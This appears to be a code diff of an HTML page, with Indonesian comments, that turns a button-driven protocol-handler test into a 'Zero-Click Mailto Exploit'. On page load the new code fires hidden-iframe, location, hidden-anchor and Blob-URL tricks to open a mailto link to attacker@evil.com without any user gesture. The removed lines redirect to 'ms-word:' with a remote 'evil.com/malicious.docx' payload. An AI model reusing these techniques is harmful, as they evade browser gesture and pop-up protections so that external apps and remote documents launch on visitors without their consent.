@@ -3,38 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Custom Protocol Handler Test</title>
+    <title>Zero-Click Mailto Exploit</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
-        .panel { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); max-width: 600px; width: 100%; }
-        h2 { color: #d32f2f; margin-bottom: 10px; }
-        p { margin-bottom: 20px; line-height: 1.6; color: #555; }
-        button { width: 100%; padding: 14px; cursor: pointer; border: none; border-radius: 6px; font-weight: bold; font-size: 15px; margin-bottom: 10px; color: #fff; transition: background 0.2s; }
-        .btn-word { background: #2b579a; }
-        .btn-word:hover { background: #1e3f6e; }
-        .btn-mail { background: #d32f2f; }
-        .btn-mail:hover { background: #b71c1c; }
-        .btn-intent { background: #3ddc84; color: #000; }
-        .btn-intent:hover { background: #2bb866; }
-        .btn-blob { background: #f39c12; color: #000; }
-        .btn-blob:hover { background: #d68910; }
-        #status { margin-top: 20px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; border: 1px solid #ffcdd2; }
-        .log { background: #1e1e1e; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
+        .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
+        h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
+        p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
+        #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
+        .log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
     </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h2>Custom Protocol Handler Test</h2>
-    <p>Menguji apakah Blob URL bisa dialihkan ke protokol eksternal tanpa peringatan.</p>
-    
-    <button id="btn-word" class="btn-word">Redirect ke ms-word:</button>
-    <button id="btn-mail" class="btn-mail">Redirect ke mailto:</button>
-    <button id="btn-intent" class="btn-intent">Redirect ke intent:// (Android)</button>
-    <button id="btn-blob" class="btn-blob">Redirect via Blob URL</button>
-    
-    <div id="status" role="status">Sistem siap.</div>
+    <h1>Zero-Click Mailto Exploit</h1>
+    <p>Mencoba membuka aplikasi Email secara otomatis tanpa interaksi (No Gesture).</p>
+    <div id="status" role="status">Memuat halaman...</div>
     <div class="log" id="log">Log akan muncul di sini...</div>
 </div>
 
@@ -47,96 +32,93 @@
         console.log(msg);
     }
 
-    // 1. Redirect ke ms-word:
-    document.getElementById("btn-word").addEventListener("click", () => {
-        statusDiv.textContent = "Mencoba redirect ke ms-word:...";
-        log("Memicu ms-word: protocol...");
-        try {
-            window.location.href = "ms-word:ofe|u|https://evil.com/malicious.docx";
-            log("Redirect ms-word dipicu.");
-            statusDiv.textContent = "Berhasil? Cek apakah aplikasi Word terbuka.";
-            statusDiv.style.color = "#4CAF50";
-        } catch (e) {
-            log("Gagal: " + e.message);
-            statusDiv.textContent = "Gagal: " + e.message;
-            statusDiv.style.color = "#f00";
-        }
-    });
+    // Payload mailto
+    const mailtoUrl = "mailto:attacker@evil.com?subject=System%20Compromised&body=Your%20data%20has%20been%20stolen";
 
-    // 2. Redirect ke mailto:
-    document.getElementById("btn-mail").addEventListener("click", () => {
-        statusDiv.textContent = "Mencoba redirect ke mailto:...";
-        log("Memicu mailto: protocol...");
+    // --- METODE 1: IFrame Injection (Seringkali lolos dari blokir) ---
+    function triggerViaIframe() {
         try {
-            window.location.href = "mailto:attacker@evil.com?subject=Hacked&body=Your%20system%20has%20been%20compromised";
-            log("Redirect mailto dipicu.");
-            statusDiv.textContent = "Berhasil? Cek apakah aplikasi Email terbuka.";
-            statusDiv.style.color = "#4CAF50";
-        } catch (e) {
-            log("Gagal: " + e.message);
-            statusDiv.textContent = "Gagal: " + e.message;
-            statusDiv.style.color = "#f00";
-        }
-    });
-
-    // 3. Redirect ke intent:// (Android)
-    document.getElementById("btn-intent").addEventListener("click", () => {
-        statusDiv.textContent = "Mencoba redirect ke intent://...";
-        log("Memicu intent:// protocol...");
-        try {
-            // Intent untuk membuka dialer telepon
-            window.location.href = "intent://#Intent;action=android.intent.action.DIAL;end";
-            log("Redirect intent:// dipicu.");
-            statusDiv.textContent = "Berhasil? Cek apakah aplikasi Dialer terbuka.";
-            statusDiv.style.color = "#4CAF50";
-        } catch (e) {
-            log("Gagal: " + e.message);
-            statusDiv.textContent = "Gagal: " + e.message;
-            statusDiv.style.color = "#f00";
-        }
-    });
-
-    // 4. Redirect via Blob URL (Menguji apakah Blob URL bisa melewati pembatasan origin)
-    document.getElementById("btn-blob").addEventListener("click", () => {
-        statusDiv.textContent = "Membuat Blob URL untuk redirect...";
-        log("Membuat Blob URL...");
-        
-        // HTML yang akan melakukan redirect
-        const redirectHTML = `
-            <!DOCTYPE html>
-            <html>
-            <head><title>Redirecting...</title></head>
-            <body>
-                <h1>Redirecting to external protocol...</h1>
-                <script>
-                    // Redirect ke ms-word
-                    window.location.href = 'ms-word:ofe|u|https://evil.com/malicious.docx';
-                <\/script>
-            </body>
-            </html>
-        `;
-        
-        try {
-            const blob = new Blob([redirectHTML], { type: 'text/html' });
-            const blobUrl = URL.createObjectURL(blob);
+            log("Mencoba metode: Iframe Injection...");
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = mailtoUrl;
+            document.body.appendChild(iframe);
             
-            // Buka Blob URL di tab baru
-            const w = window.open(blobUrl, '_blank');
-            
-            if (w) {
-                log("Blob URL dibuka. Redirect di dalamnya akan dijalankan.");
-                statusDiv.textContent = "Blob URL dibuka. Cek tab baru.";
-                statusDiv.style.color = "#4CAF50";
-            } else {
-                log("Pop-up diblokir.");
-                statusDiv.textContent = "Pop-up diblokir.";
-                statusDiv.style.color = "#f00";
-            }
+            // Cleanup
+            setTimeout(() => {
+                if (iframe.parentNode) document.body.removeChild(iframe);
+            }, 2000);
         } catch (e) {
-            log("Gagal: " + e.message);
-            statusDiv.textContent = "Gagal: " + e.message;
-            statusDiv.style.color = "#f00";
+            log("Iframe gagal: " + e.message);
         }
+    }
+
+    // --- METODE 2: Synchronous window.location (Race Condition) ---
+    function triggerViaLocation() {
+        try {
+            log("Mencoba metode: window.location...");
+            window.location.href = mailtoUrl;
+        } catch (e) {
+            log("Location gagal: " + e.message);
+        }
+    }
+
+    // --- METODE 3: Anchor Click (Trik klik tersembunyi) ---
+    function triggerViaAnchor() {
+        try {
+            log("Mencoba metode: Anchor Click...");
+            const a = document.createElement('a');
+            a.href = mailtoUrl;
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            setTimeout(() => {
+                if (a.parentNode) document.body.removeChild(a);
+            }, 2000);
+        } catch (e) {
+            log("Anchor gagal: " + e.message);
+        }
+    }
+
+    // --- METODE 4: Blob URL Redirect (Jembatan) ---
+    function triggerViaBlob() {
+        try {
+            log("Mencoba metode: Blob URL Redirect...");
+            const blobHTML = `<script>window.location.href='${mailtoUrl}';<\/script>`;
+            const blob = new Blob([blobHTML], { type: 'text/html' });
+            const url = URL.createObjectURL(blob);
+            
+            // Buka di iframe agar tidak memicu blokir pop-up
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = url;
+            document.body.appendChild(iframe);
+            
+            setTimeout(() => {
+                if (iframe.parentNode) document.body.removeChild(iframe);
+                URL.revokeObjectURL(url);
+            }, 2000);
+        } catch (e) {
+            log("Blob gagal: " + e.message);
+        }
+    }
+
+    // EKSEKUSI OTOMATIS SAAT DOM SIAP (NO GESTURE)
+    window.addEventListener("DOMContentLoaded", () => {
+        statusDiv.textContent = "Memicu Zero-Click Mailto...";
+        
+        // Tembak semua metode secara berurutan
+        triggerViaIframe();
+        
+        setTimeout(triggerViaLocation, 100);
+        setTimeout(triggerViaAnchor, 200);
+        setTimeout(triggerViaBlob, 300);
+
+        // Update status
+        setTimeout(() => {
+            statusDiv.textContent = "Semua metode dipicu. Cek apakah aplikasi Email terbuka!";
+            statusDiv.style.color = "#4CAF50";
+        }, 500);
     });
 </script>
 </body>
